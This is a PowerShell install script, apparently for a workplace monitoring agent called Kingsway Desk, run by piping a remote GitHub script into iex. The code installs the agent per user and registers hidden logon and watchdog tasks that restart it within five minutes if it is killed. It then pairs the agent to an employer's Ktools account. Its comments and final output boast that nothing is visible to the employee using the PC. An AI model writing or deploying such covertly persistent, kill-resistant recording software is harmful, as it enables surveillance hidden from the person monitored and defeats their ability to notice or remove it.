# Kingsway Desk for Windows - headless installer. Per-user, no admin rights.
#
#   irm https://raw.githubusercontent.com/plakhani-glitch/kdesk-releases/main/install.ps1 | iex
#
# Optional, set before running:
#   $env:KDESK_CODE    = 'ABCD-1234'   pairing code -> pairs without asking
#   $env:KDESK_VERSION = '0.3.0'       pin a release (default: latest)
#
# What it does: downloads the release zip (SHA-256 checked), unpacks it into
# %LOCALAPPDATA%\KingswayDesk\app, installs the `kdesk` command, then runs the
# agent once. The agent registers two HIDDEN Task Scheduler tasks (run at logon
# + a 5-minute watchdog, no time limit) and hands over to them. Nothing is
# visible to the person using the PC: no tray icon, no window, no Start-menu
# entry, no Startup-apps entry. Re-running this script updates in place and
# keeps the pairing.
$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'
try { [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12 } catch {}

$Repo    = if ($env:KDESK_REPO) { $env:KDESK_REPO } else { 'plakhani-glitch/kdesk-releases' }
$Version = $env:KDESK_VERSION
$Root    = Join-Path $env:LOCALAPPDATA 'KingswayDesk'
$AppDir  = Join-Path $Root 'app'
$Exe     = Join-Path $AppDir 'KingswayDesk.exe'
$Kdesk   = Join-Path $Root 'kdesk.ps1'
$Tmp     = Join-Path $env:TEMP ('kdesk-install-' + [guid]::NewGuid().ToString('N').Substring(0, 8))
$Asset   = 'KingswayDesk-win-x64.zip'
$Base    = if ($Version) { "https://github.com/$Repo/releases/download/v$Version" } else { "https://github.com/$Repo/releases/latest/download" }
$Raw     = "https://raw.githubusercontent.com/$Repo/main"

function Step([string]$t) { Write-Host ''; Write-Host "==> $t" -ForegroundColor Cyan }
function Ok([string]$t)   { Write-Host "    [ok] $t" -ForegroundColor Green }
function Warn([string]$t) { Write-Host "    [!!] $t" -ForegroundColor Yellow }
function Invoke-Native([string]$exe, [string[]]$argv) {
  $prev = $ErrorActionPreference; $ErrorActionPreference = 'Continue'
  try { $out = & $exe @argv 2>&1; $code = $LASTEXITCODE } finally { $ErrorActionPreference = $prev }
  return @{ Code = $code; Out = @($out | ForEach-Object { "$_" }) }
}
function Get-LiveControl {
  $cf = Join-Path $Root 'control.json'
  if (-not (Test-Path -LiteralPath $cf)) { return $null }
  try { $c = Get-Content -LiteralPath $cf -Raw | ConvertFrom-Json } catch { return $null }
  if (-not (Get-Process -Id $c.pid -ErrorAction SilentlyContinue)) { return $null }
  return $c
}
function Get-AgentStatus($c) {
  return Invoke-RestMethod -Method GET -Uri "http://127.0.0.1:$($c.port)/status" -Headers @{ Authorization = "Bearer $($c.secret)" } -TimeoutSec 30
}

Write-Host ''
Write-Host 'Kingsway Desk for Windows' -ForegroundColor White
Write-Host "Headless install for $env:USERNAME on $env:COMPUTERNAME"
$arch = if ($env:PROCESSOR_ARCHITEW6432) { $env:PROCESSOR_ARCHITEW6432 } else { $env:PROCESSOR_ARCHITECTURE }
if ($arch -ne 'AMD64') { Warn "This build is x64; this PC reports $arch. It will run under emulation on Windows 11 ARM." }

Step "Downloading $Asset from github.com/$Repo"
New-Item -ItemType Directory -Force -Path $Tmp, $Root | Out-Null
$zip = Join-Path $Tmp $Asset
Invoke-WebRequest -UseBasicParsing -Uri "$Base/$Asset" -OutFile $zip
Invoke-WebRequest -UseBasicParsing -Uri "$Base/$Asset.sha256" -OutFile "$zip.sha256"
$want = ((Get-Content -LiteralPath "$zip.sha256" -Raw) -split '\s+')[0].ToLower()
$have = (Get-FileHash -LiteralPath $zip -Algorithm SHA256).Hash.ToLower()
if ($want -ne $have) { throw "Download corrupted: SHA-256 mismatch (expected $want, got $have)" }
Ok ('{0:N1} MB, SHA-256 verified' -f ((Get-Item -LiteralPath $zip).Length / 1MB))

Step 'Stopping the running agent (if any)'
foreach ($t in 'KingswayDesk', 'KingswayDeskWatchdog') { $null = Invoke-Native 'schtasks.exe' @('/Change', '/TN', $t, '/DISABLE') }
$procs = @(Get-Process -Name 'KingswayDesk' -ErrorAction SilentlyContinue)
if ($procs.Count) { $procs | Stop-Process -Force; Start-Sleep -Seconds 2; Ok "Stopped $($procs.Count) process(es)" } else { Ok 'Nothing running' }

Step "Installing to $AppDir"
$extract = Join-Path $Tmp 'x'
Expand-Archive -LiteralPath $zip -DestinationPath $extract -Force
$found = Get-ChildItem -LiteralPath $extract -Filter 'KingswayDesk.exe' -Recurse | Select-Object -First 1
if (-not $found) { throw 'KingswayDesk.exe not found inside the download.' }
for ($i = 0; $i -lt 5; $i++) {
  if (-not (Test-Path -LiteralPath $AppDir)) { break }
  try { Remove-Item -LiteralPath $AppDir -Recurse -Force; break } catch { Start-Sleep -Seconds 2 }
}
if (Test-Path -LiteralPath $AppDir) { throw "Could not replace $AppDir (a file is still in use). Sign out and in, then run the installer again." }
Move-Item -LiteralPath $found.Directory.FullName -Destination $AppDir
Get-ChildItem -LiteralPath $AppDir -Recurse -File | Unblock-File -ErrorAction SilentlyContinue
Ok 'Files in place'

Step 'Installing the kdesk command'
foreach ($f in 'kdesk.ps1', 'kdesk.cmd') { Invoke-WebRequest -UseBasicParsing -Uri "$Raw/$f" -OutFile (Join-Path $Root $f) }
Get-ChildItem -LiteralPath $Root -File | Unblock-File -ErrorAction SilentlyContinue
$userPath = [Environment]::GetEnvironmentVariable('Path', 'User')
if (-not (@($userPath -split ';') -contains $Root)) {
  [Environment]::SetEnvironmentVariable('Path', ((@($userPath, $Root) | Where-Object { $_ }) -join ';'), 'User')
}
if (-not (@($env:Path -split ';') -contains $Root)) { $env:Path = "$env:Path;$Root" }
Ok 'kdesk is on the PATH (new terminals pick it up)'

Step 'Registering the always-on tasks and starting the agent'
$p = Start-Process -FilePath $Exe -PassThru -Wait
if ($p.ExitCode -ne 0) { Warn "Installer step exited with code $($p.ExitCode) (Task Scheduler refused; Startup fallback used). Details: kdesk log" }
$deadline = (Get-Date).AddSeconds(45); $live = $null
while ((Get-Date) -lt $deadline) { $live = Get-LiveControl; if ($live) { break }; Start-Sleep -Milliseconds 700 }
if (-not $live) {
  Warn 'The agent did not report in within 45 s. Last log lines:'
  & $Kdesk log 40
  throw 'Install incomplete: the agent is not running.'
}
Ok "Agent v$($live.version) running (pid $($live.pid))"
foreach ($t in 'KingswayDesk', 'KingswayDeskWatchdog') {
  $r = Invoke-Native 'schtasks.exe' @('/Query', '/TN', $t, '/FO', 'CSV', '/NH')
  if ($r.Code -eq 0) {
    $line = $r.Out | Where-Object { $_ -and $_.Trim() } | Select-Object -First 1
    $cols = "$line" -split '","'
    $state = if ($cols.Count -ge 3) { $cols[2].Trim('"').Trim() } else { 'present' }
    Ok "Task $t : $state"
  } else { Warn "Task $t is missing; autostart is relying on the Startup fallback" }
}

Step 'Connecting to Ktools'
Start-Sleep -Milliseconds 800
$st = Get-AgentStatus $live
if ($st.paired) { Ok "Already connected as $($st.device.name) <$($st.device.email)>" }
else {
  $code = $env:KDESK_CODE
  if (-not $code) {
    Write-Host ''
    Write-Host '    This PC is not connected yet. To get a code: the employee signs in to Ktools,'
    Write-Host '    Drafting > Connect Desktop > Generate code (valid 10 minutes).'
    Write-Host '    Press Enter to skip and pair later with:  kdesk pair ABCD-1234'
    $code = Read-Host '    Pairing code'
  }
  if ($code) { & $Kdesk pair $code } else { Warn 'Not connected yet. Nothing is recorded until it is paired.' }
}

Remove-Item -LiteralPath $Tmp -Recurse -Force -ErrorAction SilentlyContinue
Write-Host ''
Write-Host 'Done.' -ForegroundColor Green
Write-Host '  Visible to the employee : nothing (no tray icon, window, Start-menu or Startup entry)'
Write-Host '  Starts                  : at every sign-in; brought back within 5 minutes if killed'
Write-Host '  Manage from PowerShell  : kdesk status | today | pause | resume | sync | log | update | uninstall'
Write-Host '  Admin commands ask for the owner PIN (set in Ktools > Drafting > Connect Desktop).'
